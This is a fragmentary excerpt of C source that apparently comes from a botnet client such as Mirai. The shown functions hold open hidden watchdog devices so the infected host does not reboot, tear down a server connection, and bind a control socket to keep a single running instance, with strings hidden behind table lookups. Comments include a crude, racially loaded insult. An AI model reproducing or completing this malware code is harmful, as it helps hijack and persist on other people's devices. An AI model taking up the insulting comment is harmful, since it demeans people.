...
void watchdog_maintain(void)
{
    ...
    if((watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_1, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_2, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_3, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_4, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_5, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_6, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_7, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_8, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_WATCHDOG_9, NULL), 2)) != -1)
    {
        #ifdef DEBUG
...
static void teardown_connection(void)
{
    ...
    fd_serv = -1;
    sleep(1);//EAT MY ASS NIBBA																																																																																													accrobat didnt mean it!
}
...
static void ensure_single_instance(void)
{
    ...
    if(bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        ...
        {
            #ifdef DEBUG//supa dupa a..cro.batiett
